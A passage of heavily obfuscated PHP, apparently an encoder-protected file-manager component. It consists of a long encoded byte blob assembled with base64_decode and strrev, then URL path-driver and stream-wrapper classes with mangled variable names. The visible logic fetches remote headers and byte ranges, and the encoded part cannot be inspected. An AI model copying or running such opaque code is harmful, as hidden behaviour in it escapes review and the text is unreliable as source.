'."\0".'c')."\377\113\201\52\24\36\23\54\62\361\242\251\30\377\123\31\224\301\261\256\302\312\113\315\144\125\250\223\352\153\153\245\340\102\210\106\122\366\27\162\321\116\46\274\0\217\17\131\304\261\332\106\122\36\242\117\375\146"."\340\44\123\363\5\352\306\23\61\52\60\360\241\45\41\346\103\117\263\56\7\21\13\267\46\15\113\122\116\115\106\33\352\363\47\341\36\4\344\35\145\355\200\153\373\220\2\323\150\147\141\114\314\312\222\215\350\53".base64_decode('mIsxsAURFIgxwSTPFg1QGMfGaQw9CdehZjUPXwY2EW/DEIagDecVOulhfmhH6EZAN2fMMB9GZPmI2w==')."\xd3\xe6\x0\x2e\x5a\x81\x28\x14\x66\x6d\x15\xb4\x1a\x6b\xa6\xb3\x42\x2b\xc8\x83\x45\x85\xc1\x1b\x6d\xb3\x84\xb5\x19\x65\x62\x64\x60\xeb\x31\x8a\x65\xe9\x5a\x46\x2e\xb8\x48\xf8\xe0\x9e\x33\x82\xbe\xc1\x19\x50\x1e\xaf\x10\x8d\x12\xf4".strrev('NÕ5z·Á>¶{²!‹Qùû¥`’Tu'."\0".'R?Ó©ppØˆ¬.—×X¬®ø‹„ây	ĞĞ—%„¨düím')."\32\140\376\243\310\45\20\161\251\60\204\226\51\302\244\241\260\112\302\103\140\76\100\177\267\311\72\73\240\236\142\153\251\24\74\255\40\61\202\205\266\233\64\13\336\113\322\130\41\53\347\25\203\306\100\126\121\356"."\x5d\x2c\x66\x5c\x6c\xcd\xc8\x50\x69\xb2\x70\xf4\x2e\x56\x3d\x86\x5\x65\x2\x19\x89\x15\x94\x2c\x3e\x4b\x41\xa6\x71\x14\x3e\x3a\x1\x3c\x91\xd5\xa1\xa3\xba\xa4\x18\x57\x73\xf0\x6\x52\x66\x95\xd4\x81\x44\xf\xb8\xd1\x0\xc5\x49\xeb"."\x8a\x92\xb7\x40\xe2\xd9\xa2\x62\x1\xc8\xd9\x42\x46\x46\x10\xc\x20\x2f\x7a\x78\xe3\x6e\x6f\xda\xed\xd5\xdd\x5e\xb2\x13\xdf\x1d\xff\xec\x41\x92\xc9\xaa\x45\x5c\x70\xd1\x77\x40\x50\x3\xf1\x46\x1b\xfa\xec\x49\xab\xa9\xb2\x70\xb8\x55"."\x28\x9b\x50\xa0\x52\xdd\x30\x57\xe8\xc9\x8\xaa\x36\xf0\xcc\x32\x6\x2d\x85\x62\xfc\x68\xa3\xe4\x12\x9\x95\x19\xd2\x4c\xb6\xcc\xa\x1f\x81\x37\xe0\xe8\xa2\x83\x30\xb\xfe\x32\x2c\xc4\x49\x65\xa9\x56\x58\xa0\xab\x3d\xd6\xd6\x19\xe8"."\211\241\175\100\260\73\342\351\264\45\0\306\32\11\170\113\300\255\101\352\103\330\326\264\170\316\252\265\246\346\221\54\320\303\135\24\201\250\154\60\37\272\304\65\45\311\3\315\13\160\160\336\374\270\356\246\366\231"."\161\141\127\144\344\344\54\123\212\162\123\225\167\267\121\44\162\4\161\153\323\31\40\23\314\115\366\210\235\152\234\232\77\171\73\227\203\46\100\357\43\301\220\47\264\214\73\121\6\51\21\117\150\202\24\230\207\70"."\x25\xa4\x7e\xf2\xe6\x2d\x58\xb0\x80\xbe\xf5\x9a\xc8\x62\x83\x4e\x68\x66\xc0\xee\xdc\x1\x14\x9e\x60\x29\xa5\x50\xb9\x14\x13\x6a\xf1\x21\x2b\x28\xcb\x9d\x7d\x48\xd6\x3d\xb8\x5\x65\x12\x97\xab\x85\x9\x12\xd5\x2\x7d\xa9\xb3\x40\x35".base64_decode('3QtFeiHOjuQEX0Ozye8I+Y2PEdqXdaJ/kJBJftUgZ2zpMag+R8NgOcrys1Ckl9wveeV8pSkFAdo8qQ==')."\13\232\76\345\323\322\30\150\71\366\322\155\160\217\45\106\106\311\146\143\120\155\216\124\67\221\321\44\373\56\223\106\47\376\6\57\206\200\213\124\347\3\162\130\120\101\62\363\310\164\27\64\6\270\263\15\142\202"."\xe8\x72\x11\x45\x20\xe8\xa3\x1\x70\x1c\x2b\x12\xf2\x84\x4a\x9d\x2f\xa0\xa3\x87\x18\x60\x86\x82\xc3\x4c\x28\x4e\x49\x70\xfd\x41\x96\x14\x16\x1f\x3c\xb\xb5\x24\x19\xb6\x46\xec\x78\x27\xa9\x8c\xcc\x93\x90\x57\x29\xe2\x6b\xbd\xbc\x23"."\47\364\31\11\174\6\32\227\111\330\54\330\242\144\210\21\112\40\215\26\135\105\234\120\132\341\251\265\165\265\202\125\110\300\353\17\307\116\10\103\337\253\235\1\352\323\307\232\20\0\151\221\320\4\51\236\320\104"."\x29\xc1\xd6\x13\x26\x48\xf1\xd2\x4d\x86\x35\xa5\x33\x18\xc\x8b\xee\xa3\x6c\xd5\xeb\xed\x11\x1c\x4e\x92\x4d\x34\x5c\xe0\xe9\x5b\x3b\xdd\xbd\x9d\x84\x7f\x45\x9\x5\x47\x9\xc3\xf6\x12\x15\xa9\x68\x71\x6a\x6d\x3\x35\x18\xe2\xf\xa4"."\xc2\xbe\x89\x9\x4f\x8f\xe3\x63\x37\x1c\xd6\xd0\x36\xe\x87\xa5\x84\x8c\xd\x6b\xe2\xa\x16\x1d\x94\x24\x74\x36\xb\x6b\x27\x19\x40\xa0\xa6\xec\x7e\x32\xf4\x24\xed\x76\x57\xb9\xa6\x57\x4f\x99\x9c\x13\x61\xd1\x1a\x8\x8c\xd6\xb8\x27"."\xf7\x92\x6a\x4c\xe6\x30\x80\x30\x85\xc1\xdd\x2b\xaa\x2a\xc6\x2b\xab\x5d\x35\x55\xd1\xba\x6a\xa6\x2\x16\xa5\xd6\x68\xd1\x68\x91\x28\x50\xf5\xaf\x6e\x58\xc3\xfd\x5a\x46\xfb\x5c\x35\xd1\xfe\x29\x82\x46\xda\x6a\x0\x58\xc3\x0\xc3\x19"."\172\246\206\174\147\60\54\243\246\252\257\242\262\337\125\323\267\42\32\355\207\301\152\0\153\204\360\150\330\125\123\355\150\231\342\356\125\15\21\37\173\347\236\20\207\164\71\265\107\53\260\13\2\50\327\250\140\53"."\205\254\61\104\235\334\36\77\140\312\202\113\76\63\127\20\310\26\237\305\211\312\355\30\102\227\224\42\135\373\120\220\32\200\25\270\222\277\125\41\227\105\55\263\245\126\152\5\362\234\305\6\333\342\67\120\250\235"."\x3e\x5d\x28\x28\x26\xba\xe5\x44\x10\xf1\x9d\x17\x18\x17\xde\xe3\x15\xea\xa\x84\x3a\xc1\x9d\xc\x2c\x88\x7a\x68\x22\xd2\x82\x6c\x64\x26\xf0\x3f\x84\x5d\x82\x80\x6\x8\x75\xc2\x3e\x27\xe1\xa9\x80\xb0\xd0\x76\xd8\x5c\x7d\x91\xbd\x56"."\151\37\342\260\101\137\74\302\135\15\76\205\66\77\324\123\12\327\53\37\216\223\36\200\175\34\263\175\220\31\170\147\205\75\253\317\52\303\160\115\56\32\245\162\124\102\56\300\73\237\44\76\135\7\35\117\276\315"."\x42\xbd\x3d\xd0\xc1\x1e\xe4\x4\x31\x7a\xd0\x2a\x80\x2\xdd\x81\x58\x38\xb0\xdc\x5f\x92\x0\xfd\x4c\x97\x4f\x1\xeb\x7d\x24\x40\xc5\x1f\x1\xde\x1d\x44\x3e\xed\x2c\xf0\xde\xee\x85\xdd\xc1\x25\xe5\x50\x23\x5d\x3d\x5c\x96\x10\x92\xbc"."\236\356\110\114\330\270\342\35\15\330\227\261\55\15\125\172\117\350\211\31\365\161\66\315\230\257\67\52\360\223\231\102\327\174\356\230\141\304\311\154\0\350\246\310\307\175\253\220\154\350\164\226\124\1\171\232\41\31".base64_decode('xKMeMdkhlT3oYbsuYgxiO8OMq3mZesrN0W/nmEUddDNFXfQg6zcqGYj33wV2iUhMznSQqiOTcOFgLw==')."\x6f\x86\x94\xb4\x18\xed\xd4\x98\xde\x1f\x5a\xcd\xcb\x14\x1\xdf\x55\x12\x8c\x55\xe0\x4e\xc6\x93\x30\x8b\xe2\x9b\x4d\xdc\xf0\x1c\xc6\xda\xb9\xcb\x57\xc1\xd4\xcf\x59\x27\xb1\x16\xc5\x70\xc9\x38\x32\x5d\x48\xc0\xda\xe6\x65\xcc\x5\x6d".base64_decode('fhcEh7HIBj1cjDNPOjb7PuqOVhIt66hTWVgAenIItsAQ00Cx8P1t3jIxC/pmSRacBg3gOCsTUwyo1A==')."\xd5\x4b\xc5\xae\x72\x29\x65\x3e\x85\x92\x84\x1e\x4d\xd0\xcd\x1e\xf5\x99\x47\x3a\x89\xf7\x95\x49\xfb\xbb\xde\x49\x9f\x31\x13\xbd\xd2\x12\xf3\x39\xd2\xb9\xce\x7a\x49\x20\x2f\xc8\x7b\x4\x8a\xc0\x47\x16\xac\x1b\xb9\x41\x68\x96\xe3\x68"."\320\137\204\302\7\237\33\34\342\367\220\330\320\242\207\223\130\114\27\214\321\224\44\35\72\364\360\120\331\265\4\3\321\313\104\275\345\322\161\147\301\144\237\305\175\250\15\1\114\171\153\72\372\242\130\231\24\176"."\205\312\342\106\321\126\210\216\323\174\12\167\145\202\162\361\166\160\117\254\0\4\366\76\350\241\33\336\61\334\13\36\176\151\211\372\213\365\44\223\166\160\104\143\300\122\117\172\56\346\351\226\270\364\7\233\322\160"."\40\330\135\125\15\245\54\213\337\201\256\121\346\164\35\214\44\132\307\273\344\21\76\120\54\102\123\31\235\32\226\10\166\135\151\311\315\100\14\153\130\211\63\266\115\30\151\107\217\233\201\132\151\67\261\67\166\210"."\xb1\x35\x7c\xe1\x40\x2c\x34\x48\x64\xd6\x61\x6c\x45\x45\x78\x69\x23\xf3\xe6\x49\xb7\x44\xc3\x39\x35\x21\x75\x6\xdb\xe1\x7e\xdc\x17\x8\x2f\x94\xd2\x8a\x29\x71\x41\x8\xdd\x6e\x58\x67\x3e\x72\x1f\x81\x4e\x3\x29\xe1\xc7\xa9\x6a\xc"."\xa\x3a\xd1\xc9\x89\xd3\xe2\xa8\x88\xed\x52\x44\x37\x9f\xb0\xa0\x92\x82\xf1\xa8\x8b\xc5\xc1\x63\x17\x67\x92\x19\xdf\xda\x70\xa9\xe0\x50\x92\x43\xfc\xbe\x90\x7\xee\x72\xac\xbc\x2\x81\xc9\xfe\xc7\x5a\xce\xa8\x2\x2f\x10\xca\x7f\xbb"."\130\346\273\4\77\313\17\135\204\14\152\176\110\65\124\316\6\150\127\215\212\370\334\301\107\111\257\242\106\11\250\320\231\31\267\115\147\35\314\276\130\142\63\315\343\30\207\274\335\46\130\347\342\301\21\337\60\54"."\x50\xe7\x35\xe4\x92\x9e\x52\x2\x89\xa\xf7\xdd\x5\x5d\x56\xd\x45\x0\x58\x5e\x38\x24\xf8\x31\x8c\x85\x61\xa1\x40\x7b\x47\xe4\xbf\x2e\x4e\x4d\xf2\xd7\xa\x6d\x95\x51\x93\x54\x5e\x64\x1e\xc5\x81\x94\x88\xca\xc3\xba\x3f\x96\x2a\x40".base64_decode('9QbOKQI+B3pWjruoRUEgUTrgAReqgEN4dwvdJZNJpGrIDJZYf2JYIBjDT2zhqNsuJKeQSSmyURJcIw==')."\xb9\xe9\xc9\x24\xf3\x30\xe\xf\xa8\xfd\xd4\x61\xa\x8c\x70\xab\x55\xee\x63\x96\x3a\xda\x85\x5\x90\xf\xc2\x1a\x61\x4b\x66\x55\x43\x8f\x81\x50\x8b\x57\xea\x8f\x91\x36\xa\x47\xed\x9e\x79\x33\xa2\x34\x5d\x52\x16\x94\xb5\x27\x2e\x7".base64_decode('5JO4kT9DkJqkWuQrgvtQlebTdw74J9DTdP5cwbQYZXeoBn+vBAkbfFMFJTgtN1oCsFj9d9JqMFeu0A==')."\xa0\x25\x9f\xd2\xc4\x56\x23\x26\x7\xd6\xa\x7\xa\xf8\x1\x57\xc1\x21\x6c\xf5\xed\x80\xa7\xe3\x66\xf\xa2\xa8\x4e\x65\x48\xb1\x96\x33\x61\xa1\x86\x7d\x99\xe0\xd2\xb\x60\x7\xd0\x4e\x85\xab\x4a\x53\x88\x20\xab\x58\x18\x2f\x8a\x8"."\224\213\354\146\205\327\1\350\57\164\322\303\144\132\130\137\241\100\142\155\25\45\277\224\307\332\213\6\43\351\45\332\54\224\344\141\264\44\261\113\341\352\163\244\256\16\333\262\1\375\337\311\171\306\241\340\170\2"."\x24\xec\x1f\x9\x4\xf8\xac\xa2\x69\x2\xf9\x30\x57\x54\x6c\xc7\x8a\x7c\xcf\xb2\x93\x6b\xb0\x7a\x47\x0\x87\x4b\x3b\xb0\xfc\x1\x79\x3\x8f\xb5\x8e\x8a\x61\xd1\xa9\x2f\xaa\x57\x84\x19\xe9\xa8\x49\x36\x42\xe2\x6d\xbe\x93\xa6\x42\xdd"."\64\312\41\70\371\342\124\201\234\31\333\21\163\143\323\200\20\366\226\351\302\116\110\160\212\16\266\21\314\25\256\5\215\60\15\260\325\232\320\135\16\221\11\260\353\234\142\76\200\337\166\260\100\165\141\233\42\72"._kodDe('MbNKbzvIpW9pq/tww++qU34yeLw/1Tlb9K1RUnnSEz/bOzyIvQIU8R6knK6xOIM0yfH9q1b0sR/FjW4=')."\230\6\147\45\12\240\131\51\12\233\345\241\226\131\211\120\30\311\241\107\104\31\365\301\36\45\77\76\45\305\304\160\30\347\373\65\361\145\33\114\106\36\46\263\320\302\321\57\344\214\16\334\70\7\243\164\325\350"."\104\72\236\106\30\113\243\16\170\77\12\176\360\216\302\160\360\27\20\34\370\256\3\31\26\331\351\54\313\335\151\201\256\346\215\203\65\215\210\15\265\110\301\166\1\230\365\226\55\103\310\336\243\21\255\324\327\5"."\167\141\225\57\346\270\327\60\20\261\156\10\112\32\54\264\260\250\147\35\110\103\331\101\237\172\264\165\207\120\207\230\51\264\221\11\237\266\221\52\323\273\377\261\164\342\36\31\311\377\100\176\302\376\102\160\122\43"."\272\33\52\217\246\132\110\22\154\300\371\251\73\176\241\266\140\137\34\226\345\222\365\63\146\316\25\267\334\174\344\270\33\42\162\33\102\264\251\350\351\42\243\5\311\112\151\22\175\26\127\234\324\50\321\352\345\231"."\x3c\x64\x2c\x30\x75\x1b\xf3\xfd\xaf\x66\x82\xa7\x9c\x74\x8e\x33\x9\x87\x80\xac\x64\xdc\x5\x2c\x20\xf4\x5\x22\x54\xc1\xb9\xa0\xb0\x26\xd9\xbc\xc7\x69\xd0\x66\xdf\xe0\x1f\xc6\xeb\xa\x9f\xce\xd6\x6f\xa1\x4f\x94\x6b\xd1\xff\x7f\x9b"."\x11\x98\xcf\x30\xd4\x6e\xe8\xe\xd0\x85\x82\x2a\x7c\xf6\xcf\xb6\x39\x29\xdd\xeb\xe0\x32\xe9\x8e\x1\x3a\xf6\xe5\x31\xab\xb\x3e\x72\x2c\xc0\x93\x85\x3d\x81\x58\xa2\xa9\xd9\x8f\x37\x60\x76\xb8\xe4\xa1\xc7\x18\x82\xf9\x2c\x59\x63\xe1".base64_decode('XSmfq7wf8aO1/323UKEf7xu4H8IyveBeQHkTaLW4I5GtDt1+oA1Y1GIW/07ZdAqkLRyPKWYQEQgRYA==')."\370\16\324\126\40\100\344\271\372\35\322\104\110\2\41\362\127\354\4\251\12\342\172\114\161\150\112\66\226\224\301\161\225\77\364\74\6\367\60\203\346\262\145\136\13\317\122\213\257\115\240\202\304\151\122\132\64\72"."\331\40\365\45\23\33\351\216\40\207\214\236\166\366\200\10\44\3\136\5\53\121\230\32\117\61\65\353\33\106\101\172\76\14\204\53\313\326\11\304\271\215\236\300\236\222\66\40\355\1\304\11\70\273\3\154\110\25"."\xb6\x3f\x44\xa6\xe7\xb2\x31\x6a\xa8\xe0\x3d\x8b\x1c\xbe\xf0\x9e\xf2\x30\x79\x4c\x7c\x8c\x1b\x44\x19\x31\x93\xa5\x97\x30\x48\xe4\xb0\x1b\x7f\x56\x58\x59\xf9\x22\xca\x43\xdd\xd4\x8c\x5\x46\x84\xa3\x47\xb4\xd5\x60\x89\x19\x71\x17\x2"."\337\140\303\41\52\112\263\132\240\305\240\334\274\302\225\200\104\111\226\167\24\244\13\20\324\163\107\346\345\60\17\333\224\226\262\123\334\256\37\20\25\140\251\314\157\174\73\21\165\155\165\264\256\172\373\211\251\204"."\266\34\226\30\211\160\321\36\331\15\10\367\227\50\316\174\2\323\47\365\350\113\173\62\163\150\4\75\101\261\35\74\76\337\44\50\331\54\137\141\305\247\216\262\161\131\167\1\32\33\60\251\347\274\162\21\121\274"."\x2f\xb3\x69\xa4\x92\x27\x6f\x40\x5e\x4d\xc\x94\xf1\x94\x5\x3b\x1e\x2a\x8d\x9\x8b\x9b\x20\x12\x94\xa0\x71\xe\x3\x24\x7\xa6\xec\x49\x43\x68\xcf\x4\xe5\x48\xca\xca\xc4\xf7\x65\x82\x4c\xbf\xa1\x9a\x70\xcf\xfe\x5\x94\x25\xc0\x79"."\110\17\111\105\156\140\1\225\360\220\210\145\345\263\0\305\356\41\104\0\137\147\240\364\140\311\1\75\153\265\12\33\25\214\144\210\175\153\71\333\55\165\234\126\232\233\315\112\61\13\174\230\334\172\156\42\26\205".strrev('­ü »„hì¼í•¹ÛfPNÁƒ²…dœ×G­s£‰%íÅ–Ïª#”Úlq[.Şw>¾àu').base64_decode('qiGVDU9YAjxLCvd2VSH3+hAAA/gdw5VEbFsp7S8J/+HXLKtgMixkpRTo5u+JV0v8FUacTqgVCPptGg==')."\33\167\170\267\55\250\101\155\277\371\342\355\153\257\307\117\152\343\47\266\111\77\341\147\103\104\44\61\331\372\266\10\164\5\156\235\52\315\345\320\22\232\156\10\150\302\353\71\213\340\153\11\70\330\245\346\351\223".strrev('¦¯zÇ6á¤·é(ÇŸV&ƒ¸H"dŠ&-²Ø~ñm‡Ä†­ƒˆ*be	ƒ-6$ŠåìĞd6')."\321\305\264\204\243\25\325\116\41\31\345\242\217\45\202\137\370\342\110\200\273\44\101\311\370\254\331\63\44\63\45\53\173\256\136\313\6\103\270\205\113\40\322\345\33\77\224\61\16\152\211\376\361\24\124\173\16\63".strrev('ÎâDPH¨a'."\0".'P`9•T<›dÉÉ‹†FüCÊ­œ?¬.'."\r".'º™ÆtËZ0`èåqóã´Ÿ5VÉê£').base64_decode('spVh8esEL1W6+kDEUih/MMneLjThGJxcjOUFR4OE3DgI4SSYD0phrwF1NLlzSlxHtiHnn7S+68TQmA==').base64_decode('EAdwkK2F0wK17bjgKS1dh21J5DRAKL7soYGFFDqF4sR7uAkzhMt/hNOrtYuFN7B4Al3uNEvnC1yYNQ==').strrev('•¢>Šä§VÂ!x±o±îĞöÓşSÉô—¡Îo`Ì^Õ±_¸Ğô]>N‡01.œ6‹CìuKDÄ†`Œ')."\311\203\153\124\66\33\116\202\71\271\74\147\311\153\14\253\146\42\123\66\57\116\202\171\113\222\151\146\341\154\103\310\147\312\105\143\202\346\225\166\36\331\262\227\160\45\0\262\155\146\61\352\104\375\131\26\271\364".base64_decode('c4R47Nhoj1++FmXPViaqRVnkCWvBsW037+X4IU0pwwH5RXkpr+VpZa7tcZlwIQ5ZNFtLkkUdgPJaAg==')."\xa1\xb2\xb3\xd8\xb0\x5e\xdf\xdb\xe0\x62\xc7\x70\xd7\xa6\xc4\xd9\xe9\x40\x9e\x7a\x7\x3\xd9\xb9\xd7\x4d\xa8\x10\xef\xd1\xed\x9d\x43\xa5\x40\x9b\x1f\x6b\x4a\x7b\xf9\xa2\xe0\x3b\xb9\xac\x23\x6c\x7\xdc\x1f\x97\x6e\x40\xb3\xd4\x77\x9c".base64_decode('6CYc71E0U00I6kIQKHq6xun0I1l+xEYkAXxe4xO139+769Sd9/5m5+ZNO887bfuvLnbsOPvaHRvP3A==')."\xb1\x71\xdd\xf6\xb3\x36\x6d\xbf\xe4\x7a\x9c\xb0\xe3\xf2\x93\xdf\xbf\xe4\xbc\x79\xd2\x8e\x33\x4f\x82\x89\x17\x9e\xfe\xee\x7d\x77\xe1\x7f\xb7\xff\xdf\x3d\xef\x6d\xde\x6\xe4\x44\x8c\xb2\x7d\xcb\x3d\xef\x6d\xb9\x76\xe7\x86\xeb\x77\x9c"."\xb1\x75\xc7\x45\x57\xed\xf8\xf5\x19\xf4\x35\x58\xcb\xd1\x4f\xe9\x31\x91\x8b\x9f\x62\x5b\x7c\xb3\xe3\x5\x9e\x9c\xe0\xe3\x8b\x36\xa4\x1f\xc6\x2e\x6f\xe0\x46\xcd\x81\xd7\x4d\x9c\x1c\xd6\x74\x13\xfa\x5c\x0\xfc\xbe\x80\x7e\x5b\x35\xd3"."\xa4\x6c\x8\x88\xd7\x8\x13\x89\x81\xc8\xa5\x93\xa0\x79\x0\x42\xfc\xa6\x6\x8e\x10\xba\x3c\x40\xb4\x8c\x78\xe\xa\x92\x2b\x3f\xb8\xa9\xd\x2b\x38\x15\x71\x2a\x4b\x4\x5e\x4a\xb0\x48\xa8\xf4\xf6\xa1\xad\x68\xbb\x6c\xe4\x0\xb0\x1d"."\215\153\43\204\224\320\313\117\274\76\360\22\201\164\213\135\324\343\172\1\204\226\105\75\12\244\320\150\270\161\212\233\30\77\70\121\31\116\362\212\51\123\176\44\331\223\150\356\61\247\260\77\124\2\71\245\344\105".base64_decode('II1ofOjUHYzE/EsD4Ui4JKnHEw4vCYZ8WIG6JBnlEpRWSpJ6OoLdE6X5uzyBzpI0qMQC1brpQ7s4KQ==')."\xd0\x83\x6a\xe9\xe9\xec\xa4\x5a\x94\xa5\xb5\x8\x78\x17\xf2\x9a\xa0\xbb\x55\x7e\x74\x5e\xc8\x68\xf4\x74\xd8\xa6\xe1\x45\x6f\x1a\xc2\x32\x9d\x6c\xe2\xcb\x31\x4a\x8e\x1d\x7a\x9\x45\x58\xcf\x1e\xc4\x61\x36\xe8\xe3\xcf\x2c\x50\x28\xd9".base64_decode('gQjCA1Q06SaFhai/027/Is44mDSMGiRqsfHbY5flllmAo8mC2JdAhOLSjAA1ZXtMvA0uvQ1AqbwLYA==')."\x4d\x4f\xa0\x1e\x4e\x56\x69\x71\xe1\xb4\x1f\xf3\x34\xb\x37\x13\x95\x83\x70\x98\x24\xff\x3f\x8a\xb3\x6a\xf7\xe6\xc7\x0\x0"."".""."", 10, -8))); goto EäæëÆŸ¯; bô·Ê²àõ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Aìøã¥® = false) { } public function exist($f—ÎñÆÀñ¾) { $E¨´Î« = $this->info($f—ÎñÆÀñ¾); return $E¨´Î«[$_SERVER[¦·][188]]; } public function isFile($C „‹‹ÀÌÇ) { $Eã‡ùÉ¨ = $this->info($C „‹‹ÀÌÇ); return $Eã‡ùÉ¨[$_SERVER[¦·][188]]; } public function isFolder($E‡ñŠàÅ¿) { return !1; } public function size($f¦ªîåë‘Ö) { $b¶Äëœ˜Ú = $this->info($f¦ªîåë‘Ö); return $b¶Äëœ˜Ú[$_SERVER[¦·][77]]; } public function info($aï¼£ÔÎ¼) { return $this->infoParse($aï¼£ÔÎ¼); } public function infoAuth($f•ÙÓµÇÃÏ) { return $this->infoParse($f•ÙÓµÇÃÏ); } public function infoWithChildren($dÅùİ§½) { return $this->infoParse($dÅùİ§½); } public function infoFull($e„ÛÑŠµá¬) { return $this->infoParse($e„ÛÑŠµá¬); } private function infoParse($C¨¬Æ×ã“§) { $d‹ÚÈ’ì¸ =& $_SERVER[¦·]; $a¤×‰››¡ = $this->header($C¨¬Æ×ã“§); if (!$a¤×‰››¡ || !$a¤×‰››¡[$d‹ÚÈ’ì¸[690]]) { return !1; } $eÏ¥ÚòÉéì = _get($a¤×‰››¡, $d‹ÚÈ’ì¸[325], 0); $D¯¬Ó‰’ºÎ = array($d‹ÚÈ’ì¸[28] => $a¤×‰››¡[$d‹ÚÈ’ì¸[28]], $d‹ÚÈ’ì¸[75] => $C¨¬Æ×ã“§, $d‹ÚÈ’ì¸[29] => $d‹ÚÈ’ì¸[167], $d‹ÚÈ’ì¸[77] => intval($eÏ¥ÚòÉéì), $d‹ÚÈ’ì¸[160] => get_path_ext($a¤×‰››¡[$d‹ÚÈ’ì¸[28]]), $d‹ÚÈ’ì¸[1167] => $eÏ¥ÚòÉéì > 0 && $a¤×‰››¡[$d‹ÚÈ’ì¸[1293]], $d‹ÚÈ’ì¸[1168] => !1); return $D¯¬Ó‰’ºÎ; } private function header($dâ£²…â¾¨) { if (isset(self::$_cacheHeader[$dâ£²…â¾¨])) { return self::$_cacheHeader[$dâ£²…â¾¨]; } self::$_cacheHeader[$dâ£²…â¾¨] = url_header($dâ£²…â¾¨); return self::$_cacheHeader[$dâ£²…â¾¨]; } public function hashSimple($b‚«‚å›´è, $b’ÇèÃ†Ú± = false) { goto c÷–ÅàÆãÙ; d½†ĞÕ£ç¡: if ($D‡òÒ·£µ <= $CšÊšá¡÷ * $C§â§ÅÕã) { return md5($this->fileSubstr($b‚«‚å›´è, 0, $D‡òÒ·£µ)) . $D‡òÒ·£µ; } $cóŞ£ğ©ƒĞ = intval($D‡òÒ·£µ / $C§â§ÅÕã); $Cé›Àã¥¿ = $fÂò¼Ÿ˜[33]; goto b†ÄâÀÔç; dÕñİ‹¡î¤: $Cé›Àã¥¿ .= $this->fileSubstr($b‚«‚å›´è, $D‡òÒ·£µ - $CšÊšá¡÷, $CšÊšá¡÷); return md5($Cé›Àã¥¿) . $D‡òÒ·£µ; goto Eí­„ïøŒŸ; b†ÄâÀÔç: $eÒÎñÁÓİ = timeFloat(); $F›‡×¶ÄÆÓ = 15; for ($F»¼“ìµÖ = 0; $F»¼“ìµÖ < $C§â§ÅÕã; $F»¼“ìµÖ++) { if (timeFloat() - $eÒÎñÁÓİ > $F›‡×¶ÄÆÓ) { return !1; } $D×î›ªîŒÄ = $this->fileSubstr($b‚«‚å›´è, $cóŞ£ğ©ƒĞ * $F»¼“ìµÖ, $CšÊšá¡÷); if (!$D×î›ªîŒÄ) { return !1; } $Cé›Àã¥¿ .= $D×î›ªîŒÄ; } goto dÕñİ‹¡î¤; aİ¡æÕß’: $D‡òÒ·£µ = $D‹³‡Ç¬¥î[$fÂò¼Ÿ˜[77]]; $CšÊšá¡÷ = 200; $C§â§ÅÕã = 50; goto d½†ĞÕ£ç¡; c÷–ÅàÆãÙ: $fÂò¼Ÿ˜ =& $_SERVER[¦·]; $D‹³‡Ç¬¥î = $this->info($b‚«‚å›´è); if (!$D‹³‡Ç¬¥î || !$D‹³‡Ç¬¥î[$fÂò¼Ÿ˜[188]]) { return !1; } goto aİ¡æÕß’; Eí­„ïøŒŸ: } public function getContent($fšÌáÔãŸ) { return $this->fileSubstr($fšÌáÔãŸ); } public function fileSubstr($f–§×Òæ¬, $Eƒ¦ÒâŠ“† = 0, $C¿ª®©á­– = -1) { goto FĞ…–Œª¢Œ; aí‹ÄÀĞ‹ë: $d„õÇ¿‘‡¤ = url_request($f–§×Òæ¬, $C¨šøİë¼Æ[216], !1, $CÇ–±Õ“‰¤, !1, !1, 1); return $d„õÇ¿‘‡¤[$C¨šøİë¼Æ[1037]] ? $d„õÇ¿‘‡¤[$C¨šøİë¼Æ[1037]] : $C¨šøİë¼Æ[33]; goto E¸ßÃç‚Ö¨; FĞ…–Œª¢Œ: $C¨šøİë¼Æ =& $_SERVER[¦·]; $B£’ÛÉ¦ = $this->info($f–§×Òæ¬); if (!$B£’ÛÉ¦ || !$B£’ÛÉ¦[$C¨šøİë¼Æ[188]] && $B£’ÛÉ¦[$C¨šøİë¼Æ[77]] > 1024 * 1024 * 10) { return !1; } goto F£Ö»Âö¿¶; F£Ö»Âö¿¶: if ($C¿ª®©á­– === -1) { $C¿ª®©á­– = $B£’ÛÉ¦[$C¨šøİë¼Æ[77]]; } if ($C¿ª®©á­– == 0) { return $C¨šøİë¼Æ[33]; } $CÇ–±Õ“‰¤ = array($C¨šøİë¼Æ[1294] . $Eƒ¦ÒâŠ“† . $C¨šøİë¼Æ[716] . ($Eƒ¦ÒâŠ“† + $C¿ª®©á­– - 1)); goto aí‹ÄÀĞ‹ë; E¸ßÃç‚Ö¨: } public function download($DÍ‚Ş´Ÿ†, $Dö¢¼¿µ£‹) { Downloader::start($DÍ‚Ş´Ÿ†, $Dö¢¼¿µ£‹); return $Dö¢¼¿µ£‹; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($E¥öœƒáÃ, $eŸ’º¡½ä = '') { goto FÓĞ¸¬›¥â; fâ÷ÎéŒÜ»: return $this->info ? !0 : !1; goto F„ğà£Š¼·; A‡ÃĞœòÃé: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$E¥öœƒáÃ])) { self::$_chunkBuffer[$E¥öœƒáÃ] = array(); } goto fâ÷ÎéŒÜ»; FÓĞ¸¬›¥â: $this->info = $this->info($E¥öœƒáÃ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¦·][75]]; goto A‡ÃĞœòÃé; F„ğà£Š¼·: } function stream_read($bÁ¦ÆĞÛ†) { $a×ÇÙÕƒÒ = $this->fileSubstr($this->pose, $bÁ¦ÆĞÛ†); $this->pose += strlen($a×ÇÙÕƒÒ); return $a×ÇÙÕƒÒ; } public function stream_tell() { return $this->pose; } public function stream_seek($fäÁùÏ©Œ, $F”ÒéÁ‹áé) { $DœØíÙÛÜ¼ =& $_SERVER[¦·]; if ($F”ÒéÁ‹áé == SEEK_SET) { $this->pose = $fäÁùÏ©Œ; } else { if ($F”ÒéÁ‹áé == SEEK_CUR) { $this->pose += $fäÁùÏ©Œ; } else { if ($F”ÒéÁ‹áé == SEEK_END) { $this->pose = $this->info[$DœØíÙÛÜ¼[77]] + intval($fäÁùÏ©Œ); } } } if ($fäÁùÏ©Œ < 0) { $this->pose = $this->info[$DœØíÙÛÜ¼[77]] + $fäÁùÏ©Œ; } return !0; } public function stream_eof() { return $this->pose >= 